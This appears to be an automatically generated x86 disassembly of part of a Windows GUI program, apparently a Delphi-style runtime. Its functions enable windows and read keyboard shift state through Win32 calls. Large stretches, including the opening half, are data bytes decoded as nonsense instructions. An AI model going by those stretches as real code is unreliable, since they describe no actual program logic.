inc ebp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax + 0x4 ] 0xffffffa6
inc ebp
add [ ebp + edi * 4 + 0x45 ] ch
add al al
pop ecx
inc esp
add [ eax ] al
0x45
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + ebp * 4 - 0x54c3ffbb ] dl
inc ebp
add [ ecx + edi ] bl
inc eax
add al bl
into
inc ebp
add [ eax + 0x36 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ ebx + ebp * 4 - 0x7063ffbb ] ah
inc esp
add [ ecx + esi * 4 ] dl
inc ebp
add [ edx + ebp * 2 - 0x529bffbf ] al
inc ebp
add [ eax - 0x53ffba53 ] ah
scasb [ edi ]
inc ebp
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ edi + esi * 4 ] ah
inc ebp
add [ esi ] cl
sub_457db0
pop esp
int 0x45
add [ esp + ecx * 8 ] bl
inc ebp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ esi + ecx * 8 + 0x58bc0045 ] dl
inc esp
add [ eax - 0x77ffbb7c ] bl
aad 0x45
add [ ecx + eax * 4 + 0x44 ] dl
add [ edx + ebp * 8 + 0x45 ] bl
add al bh
lahf
inc ebp
add [ eax + 0x7c0045a2 ] ch
fild [ ebp ]
mov [ ebp + eax * 2 + 0x45ad0400 ] ch
add [ esi + ebp * 8 ] al
inc ebp
add ah cl
test eax 0xe9400045
inc ebp
add [ eax - 0x30 ] ah
inc ebp
add ah dh
0xb6e80045 0x45
sub_457e9a
fdiv st2
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
insb
adc [ eax ] al
loope r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
in al dx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
dec eax
mov esi 0xc1c00045
inc ebp
insb
inc ebp
add [ ecx ] ch
add al [ eax ]
push esp
mov esi 0xc1c00045
inc ebp
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8865646f
ja r-xdata
outsd
adc al 0xcd
inc ebx
add [ ecx ] ah
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
loopne r-xdata
insb
push esp
fiadd [ ebx ]
insb
add [ eax ] eax
jmp [ ebp + eax * 4 + 0x10044 ]
add [ eax ] ch
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
enter 0x45be 0x0
rol cl 0x45
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ ecx + 0x45 ]
add [ eax - 0x4d ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
loop r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40105474
add [ eax + 0x17 ] ch
inc esp
add al ah
mov ch 0x45
imul ebp [ edi + 0x6e ] r-xdata
lodsb [ esi ]
pop ss
inc esp
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
popad
outsb
inc esp
clc
inc ecx
add [ eax ] dh
add bh bh
add al 0x1f
inc esp
add [ eax ] ah
pop ds
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] dl
mov dh 0x45
add [ eax ] bh
mov bl 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
xchg esp eax
sbb eax 0xc1c00044
inc ebp
add [ eax ] al
add [ eax ] bh
mov bl 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
inc ebp
adc al 0xf3
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
add bh bh
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sbb eax 0x1d940044
inc esp
add al al
rol [ ebp ] 0x0
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x18ff0001 ] ah
xchg [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
les eax [ ebp - 0x7a17ffbc ]
inc esp
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsd
insb
outsd
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
push ebx
imul esi [ ebp + 0x58 ] 0x9b0043cc
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
inc eax
rol [ ebp ] 0x0
add [ eax ] al
add [ ebx ] 0x0
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
pop eax
int3
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
les esi [ eax + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
outsb
jae r-xdata
add [ eax ] al
sbb [ edi ] 0x0
or eax [ ebx + 0x6f ]
jae r-xdata
clc
inc ecx
add ah ah
add al [ eax ]
inc [ eax ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
mov esp 0x740043cd
add [ eax ] al
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3b00ffff ] ah
test [ eax + eax - 0x18 ] eax
test [ eax + eax ] eax
int3
outsd
outsb
sub_457fc8
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
jb r-xdata
popad
outsb
inc esp
clc
inc ecx
add [ eax ] dh
add bh bh
add al 0x1f
inc esp
add [ eax ] ah
pop ds
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
inc ebp
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sbb eax 0x1d940044
inc esp
add al al
rol [ ebp ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
loop r-xdata
add [ eax ] bh
mov bl 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
lodsb [ esi ]
pop ss
inc esp
add [ eax ] dl
mov dh 0x45
add [ eax ] bh
mov bl 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40105474
add [ eax + 0x17 ] ch
inc esp
add al ah
mov ch 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
adc al 0xf3
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
add bh bh
add [ eax ] al
js r-xdata
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x18ff0001 ] ah
xchg [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
push ebx
imul esi [ ebp + 0x58 ] 0x9b0043cc
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
inc eax
rol [ ebp ] 0x0
add [ eax ] al
add [ ebx ] 0x0
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax ] al
les eax [ ebp - 0x7a17ffbc ]
inc esp
add [ eax ] al
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
mov esp 0x740043cd
add [ eax ] al
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsd
insb
outsd
jb r-xdata
int3
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
pop eax
int3
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
les esi [ eax + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
outsb
jae r-xdata
add [ eax ] al
sbb [ edi ] 0x0
or eax [ ebx + 0x6f ]
jae r-xdata
clc
inc ecx
add ah ah
add al [ eax ]
inc [ eax ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3b00ffff ] ah
test [ eax + eax - 0x18 ] eax
test [ eax + eax ] eax
sub_458a1c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x458b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 4 + 0x45 ] dl
add [ ebx + ecx * 4 + 0x2f00045 ] cl
add [ eax ] al
enter 0x4579 0x0
adc al 0xe9
inc ecx
add [ ecx + ebp * 4 - 0x54c3ffbb ] dl
inc ebp
add [ ecx + edi ] bl
inc eax
add al bl
into
inc ebp
add [ eax + 0x36 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ ebx + ebp * 4 - 0x7063ffbb ] ah
inc esp
add [ ecx + esi * 4 ] dl
inc ebp
add [ edx + ebp * 2 - 0xb3fffbf ] al
inc ebp
add [ eax - 0x53ffba53 ] ah
scasb [ edi ]
inc ebp
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ edi + esi * 4 ] ah
inc ebp
add [ esi ] cl
inc ecx
add [ ecx + esi * 8 + 0x45 ] bh
add [ ebx + esi * 8 + 0x45 ] dl
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4 ] eax
mov ah 0x45
add [ edx + eax * 4 + 0xff00044 ] ah
inc esp
add ah dh
cmove eax [ eax ]
clc
mov ah 0x45
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add ah ch
mov dh 0x45
add [ eax - 0x7ffba4b ] bh
sbb eax 0xb7640044
inc ebp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax + 0x4 ] 0xffffffa6
inc ebp
add [ ebp + edi * 4 + 0x45 ] ch
add al al
pop ecx
inc esp
add [ eax ] al
0x45
sub_458b00
pop esp
int 0x45
add [ esp + ecx * 8 ] bl
inc ebp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ esi + ecx * 8 + 0x58bc0045 ] dl
inc esp
add [ eax - 0x77ffbb7c ] bl
aad 0x45
add [ ecx + eax * 4 + 0x44 ] dl
add [ edx + ebp * 8 + 0x45 ] bl
add al bh
lahf
inc ebp
add [ eax + 0x7c0045a2 ] ch
fild [ ebp ]
mov [ ebp + eax * 2 + 0x45ad0400 ] ch
add [ esi + ebp * 8 ] al
inc ebp
add ah cl
test eax 0xe9400045
inc ebp
add [ eax - 0x30 ] ah
inc ebp
add ah dh
0xb6e80045 0x45
sub_458b64
mov edi 0x38ffbdff
cmc
inc ebp
add [ eax - 0xb ] ah
inc ebp
add al bh
cmc
inc ebp
add [ eax - 0xa ] dl
inc ebp
add [ edi + esi * 8 ] ah
inc ebp
add [ edi + esi * 8 ] bh
inc ebp
add [ ebx + esi * 8 - 0xb5fffbb ] bh
inc ebp
add [ esi * 8 + 0x540f0045 ] cl
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebp + eax * 2 + 0xc00 ] cl
add al bl
adc [ eax ] al
or [ ecx ] bh
inc eax
je r-xdata
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x7 ] ch
inc ebp
add [ eax + 0x6b ] ch
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
add al al
in al 0x41
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax ] dl
clc
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
loopne r-xdata
add [ eax ] al
dec eax
inc ebp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
nop
mov [ ebp ] es
pushad
dec ecx
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] al
add [ eax ] bh
mov [ ebp ] es
or al 0x0
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
mov al [ 0x700458b ]
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
loop r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
nop
push 0x458d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1bffba73 ] bl
lea eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ ebp + 0x1280045 ] cl
add [ eax ] al
dec eax
inc ecx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] dl
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
hlt
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add al ah
or al [ esi ]
push 0x1c00416b
in eax 0x41
add [ edx + ebp * 2 - 0x1a0bffbf ] al
inc ecx
add al al
in al 0x41
add [ esi ] al
inc ecx
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add ah dh
or [ esi ] al
push cs
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
cmp al 0x0
add [ eax ] al
call 0x4c45d056
add [ eax ] al
add [ eax + edx + 0x500040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] ch
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
cli
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
in al 0x8d
inc ebp
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
mov al [ fs : ebp ]
movsb [ edi ] [ esi ]
jl r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
push 0x6000458d
dec ecx
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
add [ ecx + rw-data ] ah
retn
push esp
adc [ eax ] al
or al 0xc5
inc ebp
add [ eax ] ah
lds eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x69500d00
js r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax * 8 - 0x3adfffbb ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
mov [ ebp ] es
loopne r-xdata
insb
jae r-xdata
add [ eax + 0x8004036 ] dh
inc eax
outsb
arpl [ eax - 0x70 ] bp
cmp [ ebp + eax * 2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
mov [ ebp ] es
mov al [ 0x64000000 ]
dec eax
push esp
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x9000408d
mov [ ebp ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ ebp + eax * 2 + 0x458ce000 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ ebp + eax * 2 + 0xa000 ] cl
add [ eax + ecx * 2 + 0x41 ] ah
inc eax
add [ eax ] cl
jb r-xdata
sub_458e14
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_458e60
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_462418
mov eax [ rw-data ]
call sub_41e444
mov eax [ rw-data ]
call sub_41e3ec
retn
push 0x0
push eax
call ShowOwnedPopups
sub_458e98
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_402744
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_458ee8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_458f8b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_458f54
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_458e98
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458f92
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_458f9c
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_402764
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_458fd4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_459038
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_458fd4
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_459094
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_4590b4
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_459094
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4590e0
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_45fabc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45ff2c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_4086e8
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45faa8
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45ff18
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_4086e8
test eax eax
je r-xdata
sub_459160
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4591b4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4591f0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_45925c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4592ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_456578
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40460c
mov eax [ ebp - 0x8 ]
pop edx
call sub_4086e8
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4592c1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
sub_4592cc
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_4592f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_459365
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4592cc
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45936c
lea eax [ ebp - 0xc ]
call sub_40442c
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
